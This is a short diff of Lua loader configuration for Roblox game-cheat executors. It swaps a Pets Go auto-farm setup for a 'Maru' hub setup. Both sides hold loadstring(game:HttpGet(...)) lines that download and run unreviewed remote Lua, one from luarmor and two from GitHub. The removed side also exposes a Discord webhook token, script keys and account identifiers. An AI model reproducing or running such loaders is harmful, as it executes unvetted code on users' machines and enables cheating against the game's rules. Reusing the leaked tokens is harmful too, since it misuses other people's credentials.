@@ -1,13 +1,5 @@
-script_key="gxFHOFElsnHQPDUsfoMZAUDDDZijiakc";
-
-getgenv().petsGoConfig = {
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1304820433824256190/Rpf1gNmWZcG24jQXBy92k0lGWEfx7I4kBBhCwuTeNUaoKJBFDAE6xT-wURQXeh1idGjS",
-    MAILING_WEBHOOK_URL = "",
-    DISCORD_ID = "1120921298860773456",
-    WEBHOOK_ODDS = 200000000, -- Minimum Pet Odds To Trigger Webhook
-    MAIL_PET = true,  -- Mail Pet
-    MAIL_PET_ODDS = 200000000,  -- Minimum Pet Odds To Mail
-    USERNAME_TO_MAIL = "ShermanHarold8" -- Mail Pet To Username
-}
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
+getgenv().Key = "MARU-YTF5-XYHLZ-IM44-S4L73-5D6H"
+getgenv().id = "1120921298860773456"
+getgenv().Script_Mode = "Kaitun_Script"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/MaruBitkub/main/Mobile.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hoanghuyff/av/refs/heads/main/test"))()
